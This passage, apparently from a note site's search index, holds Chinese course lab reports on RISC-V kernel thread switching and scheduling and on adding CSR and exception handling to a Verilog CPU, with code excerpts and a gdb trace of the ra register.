\u5bc4\u5b58\u5668\u548c cycle \u5bc4\u5b58\u5668\u7684\u503c\uff0c\u53ef\u89c1 time \u503c\u4e3a 0\uff0ccycle \u4e0d\u4e3a 0\uff1a</p> <p>time \u5728\u5f00\u59cb\u65f6\u9700\u8981\u4e3a 0\uff0c\u6765\u8bb0\u5f55\u542f\u52a8\u65f6\u95f4\u3002cycle \u4e0d\u9700\u8981\u4e3a 0\uff0c\u56e0\u4e3a\u5176\u7528\u5904\u4e0d\u5927\u3002</p>"},{"location":"cs/system/cs2/lab5/#_5","title":"\u8c08\u8c08\u5982\u4f55\u5728\u4e00\u53f0\u4e0d\u652f\u6301\u4e58\u9664\u6cd5\u6307\u4ee4\u6269\u5c55\u7684\u5904\u7406\u5668\u4e0a\u6267\u884c\u4e58\u9664\u6cd5\u6307\u4ee4","text":"<p>\u5728\u4e00\u53f0\u4e0d\u652f\u6301\u4e58\u6cd5\u6307\u4ee4\u6269\u5c55\u7684\u5904\u7406\u5668\u4e0a\u9047\u5230\u4e58\u6cd5\u6307\u4ee4\u4f1a\u89e6\u53d1 Illegal Instruction \u5f02\u5e38\uff08\u5bf9\u5e94\u503c\u4e3a 2\uff09\uff0c\u540c\u6837\u4f1a\u8fdb\u5165 trap handler \u4e2d\uff0c\u6b64\u65f6\u975e\u6cd5\u6307\u4ee4\u7684\u7f16\u7801\u4f1a\u88ab\u5b58\u50a8\u5230 mtval\uff08\u59d4\u6258\u60c5\u51b5\u4e0b\u662f stval\uff09\u4e2d\uff0c\u6240\u4ee5\u5728 handler \u4e2d\u8bfb\u53d6\u975e\u6cd5\u6307\u4ee4\u8fdb\u884c\u5224\u65ad\uff0c\u7136\u540e\u5904\u7406\u5f97\u5230\u6b63\u786e\u7ed3\u679c\u5373\u53ef\u3002</p>"},{"location":"cs/system/cs2/lab6/","title":"RV64 \u5185\u6838\u7ebf\u7a0b\u8c03\u5ea6","text":"<p> \u7ea6 1043 \u4e2a\u5b57  82 \u884c\u4ee3\u7801  7 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 lab6 \u5b9e\u9a8c\u62a5\u544a\uff082022.12.01 ~ 2022.12.22\uff09</p> <p>Warning</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs2/lab6/#_1","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>\u5b9e\u73b0\u7ebf\u7a0b\u7684\u5207\u6362\u3001\u8c03\u5ea6\uff0c\u5e76\u5b9e\u73b0\u4e24\u79cd\u8c03\u5ea6\u7b97\u6cd5<ul> <li>\u7ebf\u7a0b\u521d\u59cb\u5316</li> <li>\u5b9e\u73b0\u7ebf\u7a0b\u5207\u6362</li> <li>\u5b9e\u73b0\u8c03\u5ea6\u5165\u53e3\u51fd\u6570</li> <li>\u5b9e\u73b0\u7ebf\u7a0b\u8c03\u5ea6<ul> <li>\u77ed\u4f5c\u4e1a\u4f18\u5148\u8c03\u5ea6\u7b97\u6cd5</li> <li>\u4f18\u5148\u7ea7\u8c03\u5ea6\u7b97\u6cd5</li> </ul> </li> </ul> </li> <li>\u5b8c\u6210 proc.c\u3001entry.S \u7b49\u4ee3\u7801\u7f16\u5199\uff0c\u5e76\u7f16\u8bd1\u8fd0\u884c</li> <li>\u601d\u8003\u9898<ol> <li>\u5728 RV64 \u4e2d\u4e00\u5171\u7528 32 \u4e2a\u901a\u7528\u5bc4\u5b58\u5668\uff0c\u4e3a\u4ec0\u4e48 context_switch \u4e2d\u53ea\u4fdd\u5b58\u4e86 14 \u4e2a\uff1f</li> <li>\u5f53\u7ebf\u7a0b\u7b2c\u4e00\u6b21\u8c03\u7528\u65f6\uff0c \u5176 ra \u6240\u4ee3\u8868\u7684\u8fd4\u56de\u70b9\u662f __dummy\u3002 \u90a3\u4e48\u5728\u4e4b\u540e\u7684\u7ebf\u7a0b\u8c03\u7528\u4e2d context_switch \u4e2d\uff0cra \u4fdd\u5b58/\u6062\u590d\u7684\u51fd\u6570\u8fd4\u56de\u70b9\u662f\u4ec0\u4e48\u5462\uff1f\u8bf7\u540c\u5b66\u7528gdb\u5c1d\u8bd5\u8ffd\u8e2a\u4e00\u6b21\u5b8c\u6574\u7684\u7ebf\u7a0b\u5207\u6362\u6d41\u7a0b\uff0c\u5e76\u5173\u6ce8\u6bcf\u4e00\u6b21 ra \u7684\u53d8\u6362\u3002</li> </ol> </li> </ul>"},{"location":"cs/system/cs2/lab6/#_2","title":"\u4ee3\u7801\u7f16\u5199","text":""},{"location":"cs/system/cs2/lab6/#_3","title":"\u7ebf\u7a0b\u521d\u59cb\u5316","text":"<p>\u5728 proc.c \u4e2d\u5b9e\u73b0 task_init \u51fd\u6570\uff0c\u521d\u59cb\u5316\u7ebf\u7a0b\uff1a</p> <ol> <li>\u8bbe\u7f6e idle<ul> <li>\u8c03\u7528 kalloc \u5206\u914d\u7269\u7406\u5185\u5b58\u9875     <pre><code>idle = (struct task_struct*)kalloc()\n</code></pre></li> <li>\u8bbe\u7f6e state \u4e3a TASK_RUNNING     <pre><code>idle-&gt;state = TASK_RUNNING;\n</code></pre></li> <li>idle \u4e0d\u53c2\u4e0e\u8c03\u5ea6\uff0c\u5c06 counter\u3001priority \u8bbe\u7f6e\u4e3a 0     <pre><code>idle-&gt;counter = 0;\nidle-&gt;priority = 0;\n</code></pre></li> <li>\u8bbe\u7f6e idle \u7684 pid \u4e3a 0     <pre><code>idle-&gt;pid = 0;\n</code></pre></li> <li>\u5c06 current \u548c task[0] \u6307\u5411 idle     <pre><code>current = idle;\ntask[0] = idle;\n</code></pre></li> </ul> </li> <li>\u521d\u59cb\u5316 task[1] ~ task[NR_TASKS-1] \u7ebf\u7a0b<ul> <li>counter \u4e3a 0\uff0cpriority \u4e3a rand()\uff0cpid \u4e3a\u4e0b\u6807</li> <li>ra \u4e3a __dummy \u5730\u5740\uff0csp \u4e3a\u5185\u5b58\u9ad8\u5730\u5740 <pre><code>for (int i = 1; i &lt; NR_TASKS; ++i) {\n    struct task_struct* _task = (struct task_struct*)kalloc();\n    _task-&gt;state = TASK_RUNNING;\n    _task-&gt;counter = 0;\n    _task-&gt;priority = (uint64)rand() % (PRIORITY_MAX - PRIORITY_MIN + 1) + PRIORITY_MIN;\n    _task-&gt;pid = i;\n    _task-&gt;thread.ra = (uint64)__dummy;\n    _task-&gt;thread.sp = (uint64)_task + PGSIZE;\n    task[i] = _task;\n}\n</code></pre></li> </ul> </li> </ol>"},{"location":"cs/system/cs2/lab6/#entrys-dummy","title":"entry.S \u4e2d\u6dfb\u52a0 dummy","text":"<p>__dummy \u5373\u8bbe\u7f6e sepc \u4e3a dummy \u51fd\u6570\u5730\u5740\uff0c\u7136\u540e\u76f4\u63a5 sret \u8fd4\u56de\uff0c\u6240\u4ee5\u4ee3\u7801\uff1a <pre><code>    .extern dummy\n    .globl __dummy\n__dummy:\n    la a0, dummy\n    csrw sepc, a0\n    sret\n</code></pre></p>"},{"location":"cs/system/cs2/lab6/#_4","title":"\u5b9e\u73b0\u7ebf\u7a0b\u5207\u6362","text":"<p>proc.c \u4e2d\u5b9e\u73b0 switch_to \u5207\u6362\u51fd\u6570\uff0c\u5982\u679c\u5f53\u524d\u7ebf\u7a0b current \u548c next \u4e00\u81f4\u5219\u4ec0\u4e48\u90fd\u4e0d\u505a\uff0c\u4e0d\u540c\u5219\u8f93\u51fa\u4fe1\u606f\u5e76\u8c03\u7528 __switch_to \u5207\u6362\u7ebf\u7a0b\u3002 <pre><code>extern void __switch_to(struct task_struct* prev, struct task_struct* next);\n\nvoid switch_to(struct task_struct* next) {\n    if (next != current) {\n        printk(\"\\nswitch to [PID = %d PRIORITY = %d COUNTER = %d]\\n\", next-&gt;pid, next-&gt;priority, next-&gt;counter);\n        struct task_struct* prev = current;\n        current = next;\n        __switch_to(prev, next);\n    }\n}\n</code></pre></p> <p>\u5728 entry.S \u4e2d\u5b9e\u73b0\u4e0a\u4e0b\u6587\u5207\u6362 __switch_to\uff0c\u63a5\u6536\u4e24\u4e2a task_struct \u6307\u9488\u4f5c\u4e3a\u53c2\u6570\uff0c\u9700\u8981\u4fdd\u5b58\u5f53\u524d\u7ebf\u7a0b\u7684 ra\u3001sp\u3001s0~s11 \u5bc4\u5b58\u5668\u5230\u5f53\u524d\u7ebf\u7a0b\u7684 thread_struct \u4e2d\uff0c\u5e76\u5c06\u4e0b\u4e00\u4e2a\u7ebf\u7a0b\u7684\u5bc4\u5b58\u5668\u6062\u590d\u3002\u5176\u4e2d task_struct \u7684\u7ed3\u6784\u4e3a\u4e00\u4e2a uint64 \u5927\u5c0f\u6307\u9488\uff0c\u56db\u4e2a uint64 \u5927\u5c0f\u7684\u503c\uff0c\u7136\u540e\u662f thread_struct \u7ed3\u6784\u4f53\uff0c\u5176\u4e2d\u662f ra\u3001sp\u3001s[12] \u7684\u4f4d\u7f6e\u3002\u6240\u4ee5\u76f8\u5bf9\u4e8e\u53c2\u6570\u7684\u504f\u79fb\u4e3a 5*8=40\uff0c\u6240\u4ee5\u4ee3\u7801\uff1a <pre><code>    .globl __switch_to\n__switch_to:\n    sd ra,40(a0)\n    sd sp,48(a0)\n    sd s0,56(a0)\n    ...\n    sd s11,144(a0)\n\n    ld ra,40(a1)\n    ld sp,48(a1)\n    ld s0,56(a1)\n    ...\n    ld s11,144(a1)\n\n    ret\n</code></pre></p>"},{"location":"cs/system/cs2/lab6/#_5","title":"\u5b9e\u73b0\u8c03\u5ea6\u5165\u53e3\u51fd\u6570","text":"<p>\u5373\u5b9e\u73b0 proc.c \u4e2d\u7684\u51fd\u6570 do_timer\uff0c\u5176\u4efb\u52a1\uff1a</p> <ol> <li>\u5982\u679c\u5f53\u524d\u7ebf\u7a0b\u662f idle \u7ebf\u7a0b\u6216\u8005\u5f53\u524d\u7ebf\u7a0b\u8fd0\u884c\u5269\u4f59\u65f6\u95f4\u4e3a 0 \u8fdb\u884c\u8c03\u5ea6     <pre><code>if (current == idle || current-&gt;counter == 0) {\n    schedule();\n}\n</code></pre></li> <li>\u5982\u679c\u5f53\u524d\u7ebf\u7a0b\u4e0d\u662f idle \u4e14\u8fd0\u884c\u5269\u4f59\u65f6\u95f4\u4e0d\u4e3a 0 \u5219\u5bf9\u5f53\u524d\u7ebf\u7a0b\u7684\u8fd0\u884c\u5269\u4f59\u65f6\u95f4\u51cf 1\uff0c\u51cf\u540e\u4e3a 0 \u4e5f\u8981\u8c03\u5ea6     <pre><code>else {\n    current-&gt;counter--;\n    if (current-&gt;counter == 0) schedule();\n}\n</code></pre></li> </ol> <p>\u7136\u540e\u5728 trap_handler \u51fd\u6570\u4e2d\u8c03\u7528 do_timer\uff1a <pre><code>void trap_handler(unsigned long scause, unsigned long long sepc) {\n    if ((scause &gt;&gt; 63) &amp;&amp; (scause &amp; 0x7FFFFFFFFFFFFFFF) == 5) {\n        // printk(\"[S] Supervisor Mode Timer Interrupt\\n\");\n        clock_set_next_event();\n        do_timer();\n        return;\n    }\n}\n</code></pre></p>"},{"location":"cs/system/cs2/lab6/#_6","title":"\u5b9e\u73b0\u7ebf\u7a0b\u8c03\u5ea6","text":"<p>\u6839\u636e\u76ee\u6807\uff0c\u5faa\u73af\u904d\u5386\u6240\u6709\u7ebf\u7a0b\uff0c\u9009\u51fa counter \u6700\u5c0f\u7684\u4e00\u4e2a\u8fdb\u884c\u5207\u6362\uff0c\u5982\u679c\u6240\u6709 counter \u90fd\u4e3a 0\uff0c\u5219\u4f7f\u7528 priority \u4e3a counter \u8d4b\u503c\uff1a <pre><code>void schedule(void) {\n    uint64 minCounter = UINT64_MAX;\n    struct task_struct* next = idle;\n    while (1) {\n        for (int i = 1; i &lt; NR_TASKS; ++i) {\n            if (task[i]-&gt;state == TASK_RUNNING &amp;&amp; task[i]-&gt;counter != 0 &amp;&amp; task[i]-&gt;counter &lt; minCounter) {\n                minCounter = task[i]-&gt;counter;\n                next = task[i];\n            }\n        }\n        if (next != idle) break;\n        for (int i = 1; i &lt; NR_TASKS; ++i) {\n            task[i]-&gt;counter = task[i]-&gt;priority;\n            if (i == 1) printk(\"\\n\");\n            printk(\"SET [PID = %d PRIORITY = %d COUNTER = %d]\\n\", task[i]-&gt;pid, task[i]-&gt;priority, task[i]-&gt;counter);\n        }\n    }\n    switch_to(next);\n}\n</code></pre></p>"},{"location":"cs/system/cs2/lab6/#_7","title":"\u8fd0\u884c\u7ed3\u679c","text":"<p>\u8fd0\u884c\u7ed3\u679c\u6b63\u786e\u3002</p>"},{"location":"cs/system/cs2/lab6/#_8","title":"\u601d\u8003\u9898","text":""},{"location":"cs/system/cs2/lab6/#context_switch-14","title":"\u4e3a\u4ec0\u4e48 context_switch \u53ea\u4fdd\u5b58 14 \u4e2a\u5bc4\u5b58\u5668","text":"<p>\u56e0\u4e3a __switch_to \u51fd\u6570\u662f\u5728 C \u8bed\u8a00\u7684 switch_to \u51fd\u6570\u4e2d\u8c03\u7528\u7684\u3002\u800c C \u8bed\u8a00\u4f1a\u5c06 RISC-V \u6807\u51c6\u4e2d\u7684 Caller \u90e8\u5206\u5b58\u5728\u6808\u4e0a\uff0c\u6240\u4ee5 __switch_to \u4e2d\u53ea\u9700\u8981\u4fdd\u5b58 C \u8bed\u8a00\u6ca1\u6709\u4fdd\u5b58\u7684 Callee \u90e8\u5206\uff08sp \u4ee5\u53ca s0~s11\uff09\u4ee5\u53ca ra \u5373\u53ef\uff0c\u4e00\u5171 14 \u4e2a\u5bc4\u5b58\u5668\u3002</p>"},{"location":"cs/system/cs2/lab6/#ra","title":"\u8c03\u8bd5\uff0c\u5173\u6ce8 ra \u53d8\u5316","text":"<p>\u67e5\u770b __switch_to \u51fd\u6570\u4e2d\u6307\u4ee4\u5730\u5740\uff1a</p> <p>\u5728 0x80200180 \u51fa\u5b58\u50a8 ra\uff0c\u5728 0x802001bc \u5904\u6062\u590d ra\uff0c\u6240\u4ee5\u5728\u8fd9\u4e24\u4e2a\u4f4d\u7f6e\u4e0b\u65ad\u70b9\uff1a</p> <p>\u8fd0\u884c\u5230\u7b2c\u4e00\u4e2a\u65ad\u70b9\u5904\u89c2\u5bdf ra \u503c\u4e3a switch_to+128\uff0c\u4e5f\u5c31\u662f\u8c03\u7528 __switch_to \u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u5730\u5740\uff1a</p> <p>\u7ee7\u7eed\u8fd0\u884c\u5230\u4e0b\u4e00\u4e2a\u65ad\u70b9\uff0cra \u503c\u4e3a __dummy \u5730\u5740\uff1a</p> <p>\uff08\u4e0a\u56fe\u4e2d Stack \u90e8\u5206\u4e0d\u6b63\u786e\uff0c\u56e0\u4e3a gdb \u56de\u6eaf\u8ddf\u4e22\u4e86 pc\uff0c\u7528 bt \u6307\u4ee4\u80fd\u770b\u5230\u62a5\u9519\uff0c\u53ef\u4ee5 si \u8ddf\u5230\u8fd9\u91cc\u6765\uff0c\u5b9e\u9645\u7684\u8c03\u7528\u6808\u662f\u6ca1\u6709\u53d8\u5316\u7684\uff09</p> <p>\u6301\u7eed\u8c03\u8bd5\uff0c\u53ef\u4ee5\u53d1\u73b0\u524d\u4e09\u6b21\u65f6\u4fdd\u5b58\u7684 ra \u662f switch_to+128\uff0c\u6062\u590d\u7684 ra \u662f __dummy\uff1b\u540e\u9762\u4fdd\u5b58\u548c\u6062\u590d\u7684 ra \u90fd\u662f switch_to+128\uff1a</p> <p>\u539f\u56e0\u662f\u524d\u4e09\u6b21\u7ebf\u7a0b\u5207\u6362\u65f6\uff0c\u8be5\u7ebf\u7a0b\u90fd\u662f\u7b2c\u4e00\u6b21\u88ab\u8c03\u5ea6\uff0c\u6ca1\u6709\u4e0a\u4e0b\u6587\u9700\u8981\u6062\u590d\uff0c\u6240\u4ee5 ra \u7684\u503c\u4e3a\u521d\u59cb\u5316\u7684 __dummy\uff0c\u4fdd\u5b58\u7684 ra \u503c\u4e3a\u4e0a\u4e00\u6b21\u8c03\u7528\u7684 ra\uff0c\u4e5f\u5c31\u662f switch_to \u4e2d\u8c03\u7528 __switch_to \u7684\u65f6\u5019\u5b58\u5165\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u5730\u5740\u3002\u800c\u540e\u9762\u7684\u7ebf\u7a0b\u5207\u6362\u4e2d\uff0c\u6240\u6709\u7ebf\u7a0b\u90fd\u5df2\u7ecf\u6709\u4e86\u4fdd\u5b58\u7684\u4e0a\u4e0b\u6587\uff0c\u6062\u590d\u7684 ra \u4e5f\u5c31\u90fd\u662f switch_to+128 \u4e86\u3002</p>"},{"location":"cs/system/cs2/lab7/","title":"\u7efc\u5408\u5b9e\u9a8c\uff08\u7279\u6743\u7ea7 CPU\uff09","text":"<p> \u7ea6 1768 \u4e2a\u5b57  220 \u884c\u4ee3\u7801  5 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 lab7 \u5b9e\u9a8c\u62a5\u544a\uff082022.12.08 ~ 2022.12.29\uff09</p> <p>Warning</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs2/lab7/#_1","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>\u5b8c\u5584 CPU Core\uff0c\u5b9e\u73b0\u90e8\u5206\u7279\u6743\u7ea7\u5185\u5bb9<ul> <li>\u589e\u52a0 CSR \u5bc4\u5b58\u5668\u53ca\u76f8\u5173\u6307\u4ee4</li> <li>\u589e\u52a0\u7279\u6743\u6001\u6307\u4ee4</li> <li>\u589e\u52a0\u5f02\u5e38\u5904\u7406\u903b\u8f91</li> </ul> </li> <li>\u8fd0\u884c Naive Kernel<ul> <li>normal\uff1aecall \u6307\u4ee4\u5904\u7406</li> <li>advance(bonus)\uff1aecall \u6307\u4ee4\u5904\u7406 + \u975e\u6cd5\u6307\u4ee4\u5f02\u5e38\u5904\u7406</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/lab7/#_2","title":"\u5b9e\u9a8c\u76f8\u5173\u903b\u8f91","text":"<p>\u672c\u6b21\u5b9e\u9a8c\u8bbe\u8ba1\u5230\u7684 RISC-V \u7279\u6743\u7ea7 ISA \u90fd\u5728\u6211\u7684\u7b14\u8bb0 https://note.tonycrane.cc/cs/pl/riscv/privileged/ \u4e2d\u6574\u7406\u8fc7\u4e86\uff0c\u8fd9\u91cc\u662f\u4e00\u90e8\u5206\u68b3\u7406\u3002</p>"},{"location":"cs/system/cs2/lab7/#csr","title":"CSR","text":"<p>RISC-V \u5206\u914d\u4e86 4096 \u4e2a CSR \u5bc4\u5b58\u5668\uff0c\u6bcf\u4e2a\u5bc4\u5b58\u5668\u6709\u4e00\u4e2a 12 \u4f4d\u7684\u7f16\u53f7\uff0c\u672c\u5b9e\u9a8c\u4e2d\u7528\u5230\u7684\u51e0\u4e2a\uff1a</p> <ul> <li>0x300 mstatus\uff1a\u5b58\u50a8 M \u6001\u7684\u72b6\u6001\u503c\uff0c\u672c\u5b9e\u9a8c\u4e2d\u53ea\u8fdb\u884c\u5199\u5165\uff0c\u800c\u4e0d\u9700\u8981\u5904\u7406\u5176\u5177\u4f53\u5185\u5bb9</li> <li>0x305 mtvec\uff1a\u5b58\u50a8 M \u6001\u7684\u4e2d\u65ad\u5411\u91cf\u5730\u5740\uff0c\u5728\u9047\u5230 trap \u65f6\u9700\u8981\u8df3\u8f6c\u6b64\u5904</li> <li>0x341 mepc\uff1a\u5b58\u50a8 trap \u53d1\u751f\u65f6\u7684 pc \u503c\uff0c\u5f02\u5e38\u5904\u7406\u7ed3\u675f\u540e\u8df3\u8f6c\u56de\u6b64\u5904</li> <li>0x342 mcause\uff1a\u5b58\u50a8 trap \u53d1\u751f\u7684\u539f\u56e0\uff0c\u672c\u5b9e\u9a8c\u4e2d\u7528\u5230\u7684\u4e24\u4e2a\u503c\uff1a<ul> <li>\u00a02 - Illegal Instruction\uff1a\u975e\u6cd5\u6307\u4ee4</li> <li>11 - Environment Call from M-mode\uff1a\u4ece M \u6001\u53d1\u51fa\u7684 ecall</li> </ul> </li> </ul> <p>\u51e0\u4e2a CSR \u64cd\u4f5c\u6307\u4ee4\uff0c\u90fd\u5728\u4e00\u4e2a\u6307\u4ee4\u4e2d\u540c\u65f6\u8fdb\u884c GPR\u3001CSR \u4e24\u4e2a\u5bc4\u5b58\u5668\u7684\u8bfb\u5199\uff1a</p> <ul> <li>csrrw\uff1acsr -&gt; rd, rs1 -&gt; csr</li> <li>csrrs\uff1acsr -&gt; rd, csr | rs1 -&gt; csr</li> <li>csrrc\uff1acsr -&gt; rd, csr &amp; ~rs1 -&gt; csr</li> </ul> <p>\u672c\u6b21\u5b9e\u9a8c\u4e2d\u6211\u5e76\u6ca1\u6709\u5b8c\u5168\u5b9e\u73b0\u8fd9\u4e9b\u76ee\u6807\uff0c\u800c\u53ea\u8003\u8651\u4e86 csrr \u548c csrw \u4e24\u79cd\u4f2a\u6307\u4ee4\u7684\u60c5\u51b5\uff1a</p> <ul> <li>csrr rd, csr\uff08\u539f\u578b\u4e3a csrrs rd, csr, x0\uff09\uff1acsr -&gt; rd</li> <li>csrw csr, rs1\uff08\u539f\u578b\u4e3a csrrw x0, csr, rs1\uff09\uff1ars1 -&gt; csr</li> </ul>"},{"location":"cs/system/cs2/lab7/#_3","title":"\u7279\u6743\u6307\u4ee4\u53ca\u5f02\u5e38\u5904\u7406\u903b\u8f91","text":"<p>\u672c\u6b21\u5b9e\u9a8c\u4e2d\u9700\u8981\u5904\u7406\u7684\u51e0\u79cd\u7279\u6b8a\u60c5\u51b5\uff1a</p> <ul> <li>ecall\uff1a<ul> <li>\u8bfb\u53d6 mtvec \u5bc4\u5b58\u5668\u7684\u503c\uff0c\u8df3\u8f6c\u5230\u6b64\u5904</li> <li>\u5c06\u6b64\u65f6\u7684 pc \u5199\u5165 mepc \u5bc4\u5b58\u5668\u4e2d</li> <li>\u5c06 11 \u5199\u5165 mcause \u5bc4\u5b58\u5668\u4e2d</li> </ul> </li> <li>mret\uff1a<ul> <li>\u8bfb\u53d6 mepc \u5bc4\u5b58\u5668\u7684\u503c\uff0c\u8df3\u8f6c\u5230\u6b64\u5904</li> </ul> </li> <li>\u975e\u6cd5\u6307\u4ee4\uff1a<ul> <li>\uff08unimp \u6307\u4ee4\u5b9e\u9645\u4e0a\u662f csr \u6307\u4ee4\u64cd\u7eb5\u4e86\u672a\u5b9a\u4e49\u7684 CSR \u5bc4\u5b58\u5668\uff0c\u6240\u4ee5\u8981\u4ed4\u7ec6\u5224\u65ad\u975e\u6cd5\u6307\u4ee4\uff09</li> <li>\u8bfb\u53d6 mtvec \u5bc4\u5b58\u5668\u7684\u503c\uff0c\u8df3\u8f6c\u5230\u6b64\u5904</li> <li>\u5c06\u6b64\u65f6\u7684 pc \u5199\u5165 mepc \u5bc4\u5b58\u5668\u4e2d</li> <li>\u5c06 2 \u5199\u5165 mcause \u5bc4\u5b58\u5668\u4e2d</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/lab7/#_4","title":"\u5177\u4f53\u5b9e\u73b0","text":""},{"location":"cs/system/cs2/lab7/#ram-rom","title":"RAM \u4e0e ROM \u66ff\u6362","text":"<p>\u4f7f\u7528\u63d0\u4f9b\u7684\u81ea\u5b9a\u4e49\u7684 myRam \u548c myRom \u6765\u66ff\u4ee3\u539f\u6765\u7684 ip \u6838\u65b9\u4fbf\u8c03\u8bd5\u3002</p> <p>\u8fd9\u91cc\u6211\u9644\u52a0\u4e86\u4e00\u4e2a\u66f4\u6539\u662f\u521d\u59cb\u5316\u6240\u6709 RAM \u503c\u4e3a 0\uff0c\u907f\u514d\u540e\u7eed\u5728\u4eff\u771f\u65f6\u51fa\u73b0\u4e0d\u5b9a\u6001\u5e72\u6270\u8fd0\u884c\u3002</p> <pre><code>module myRam(\n    ...\n    initial begin\n        for (i = 0; i &lt; 2048; i = i + 1) ram[i] &lt;= 32'h00000000;\n    end\n    ...\nendmodule\n</code></pre>"},{"location":"cs/system/cs2/lab7/#forwarding-bug","title":"Forwarding bug \u4fee\u590d","text":"<p>\u5728\u5b9e\u9645\u8fd0\u884c\u7684\u65f6\u5019\u53d1\u73b0 lab2 \u4e2d\u5199\u7684 forwarding \u6709\u4e00\u4e2a bug\uff0c\u6211\u7684\u8bbe\u8ba1\u9488\u5bf9\u6240\u6709\u8df3\u8f6c\u6307\u4ee4\u90fd\u4f1a\u5f3a\u5236 stall \u4e00\u4e2a\u5468\u671f\uff0c\u7136\u540e\u5728\u5b9e\u9645\u7684 ID \u9636\u6bb5\u5c31\u8fdb\u884c\u8df3\u8f6c\u3002\u8fd9\u91cc\u505a\u4e86 forwarding \u5904\u7406\uff0c\u4e3a\u4e86\u89e3\u51b3\u5728 R \u578b\u6307\u4ee4\u540e\u8fdb\u884c\u8df3\u8f6c\u7684\u6570\u636e\u5192\u9669\uff1a</p> <pre><code>assign reg1 = (jump &amp;&amp; EX_MEM_reg_write &amp;&amp; (EX_MEM_write_addr != 0) &amp;&amp; (EX_MEM_write_addr == IF_ID_inst[19:15])) ? EX_MEM_alu_result : read_data1;\nassign reg2 = (jump &amp;&amp; EX_MEM_reg_write &amp;&amp; (EX_MEM_write_addr != 0) &amp;&amp; (EX_MEM_write_addr == IF_ID_inst[24:20])) ? EX_MEM_alu_result : read_data2;\n</code></pre> <p>\u4f46\u662f\u8fd9\u91cc\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u679c\u8df3\u8f6c\u7684\u524d\u4e00\u53e5\u6307\u4ee4\u662f load \u6307\u4ee4\uff0c\u90a3\u4e48\u8fd9\u4e2a\u8bed\u53e5\u4e5f\u4f1a\u8ba4\u4e3a\u9700\u8981 forwarding\uff0c\u4e5f\u786e\u5b9e\u9700\u8981 forwarding\uff0c\u4e0d\u8fc7\u5b83\u62c9\u8fc7\u6765\u7684\u503c\u662f alu_result\uff0c\u5728 load \u6307\u4ee4\u4e2d alu \u8ba1\u7b97\u7684\u7ed3\u679c\u662f\u8981 load \u7684\u5730\u5740\uff0c\u800c\u8fd9\u91cc\u9700\u8981\u7684\u662f load \u51fa\u6765\u7684\u503c\u3002\u6839\u636e\u65f6\u5e8f\uff0c\u5728\u8fd9\u91cc RAM \u5df2\u7ecf\u5b8c\u6210\u8bfb\u53d6\uff0c\u6b64\u65f6\u6b63\u597d\u53ef\u4ee5\u4f7f\u7528 RAM \u4f20\u6765\u7684\u503c\u8fdb\u884c forwarding\uff0c\u6240\u4ee5\u5224\u65ad\u4e00\u4e0b mem_to_reg \u662f\u5426\u4ee3\u8868 load \u6307\u4ee4\uff0c\u5982\u679c\u662f\u5219\u4f7f\u7528 data_in \u5373\u53ef\uff1a</p> <pre><code>assign reg1 = (jump &amp;&amp; EX_MEM_reg_write &amp;&amp; (EX_MEM_write_addr != 0) &amp;&amp; (EX_MEM_write_addr == IF_ID_inst[19:15])) ? (EX_MEM_mem_to_reg == 2'b11 ? data_in : EX_MEM_alu_result) : read_data1;\nassign reg2 = (jump &amp;&amp; EX_MEM_reg_write &amp;&amp; (EX_MEM_write_addr != 0) &amp;&amp; (EX_MEM_write_addr == IF_ID_inst[24:20])) ? (EX_MEM_mem_to_reg == 2'b11 ? data_in : EX_MEM_alu_result) : read_data2;\n</code></pre>"},{"location":"cs/system/cs2/lab7/#_5","title":"\u5206\u652f\u8bed\u53e5\u6269\u5145","text":"<p>\u4e4b\u524d\u7684\u5206\u652f\u8bed\u53e5\u53ea\u5b9e\u73b0\u4e86 beq \u548c bne\uff0c\u5c06\u6240\u6709\u5206\u652f\u8bed\u53e5\u90fd\u6309\u7167 funct3[0] \u5f3a\u5236\u5206\u4e3a beq \u6216 bne\uff0c\u4f1a\u5bfc\u81f4\u7ed3\u679c\u5e76\u4e0d\u6b63\u786e\u3002\u8fd9\u91cc\u5c06\u6240\u6709\u5206\u652f\u8bed\u53e5\u90fd\u8fdb\u884c\u4e86\u5b9e\u73b0\uff0c\u53ea\u9700\u8981\u4fee\u6539\u63a7\u5236\u6a21\u5757\uff1a</p> <pre><code>case (op_code)\n    ...\n    7'b1100011: begin\n        branch = 1; jump = 1;\n        case (funct3)\n            3'b000: begin alu_op = XOR; b_type = 1; end     // beq\n            3'b001: begin alu_op = XOR; b_type = 0; end     // bne\n            3'b100: begin alu_op = SLT; b_type = 0; end     // blt\n            3'b101: begin alu_op = SLT; b_type = 1; end     // bge\n            3'b110: begin alu_op = SLTU; b_type = 0; end    // bltu\n            3'b111: begin alu_op = SLTU; b_type = 1; end    // bgeu\n        endcase\n    end\n    ...\nendcase\n</code></pre>"},{"location":"cs/system/cs2/lab7/#csr_1","title":"CSR \u5bc4\u5b58\u5668\u7ec4","text":"<p>\u6839\u636e\u524d\u9762\u7684\u5206\u6790\uff0c\u672c\u6b21\u5b9e\u9a8c\u53ea\u9700\u8981\u5b9e\u73b0\u56db\u4e2a CSR \u5bc4\u5b58\u5668\uff0c\u6240\u4ee5\u8fd9\u4e2a\u6a21\u5757\u4e2d\u53ea\u9700\u8981\u5b9a\u4e49\u56db\u4e2a\u5bc4\u5b58\u5668\u5373\u53ef\uff0c\u800c\u4e0d\u9700\u8981\u5168\u90e8\u5b9e\u73b0 4096 \u4e2a\u3002</p> <p>\u800c\u4e14\u7531\u4e8e\u5f02\u5e38\u5904\u7406\u903b\u8f91\u7684\u5b58\u5728\uff0c\u4f8b\u5982 ecall 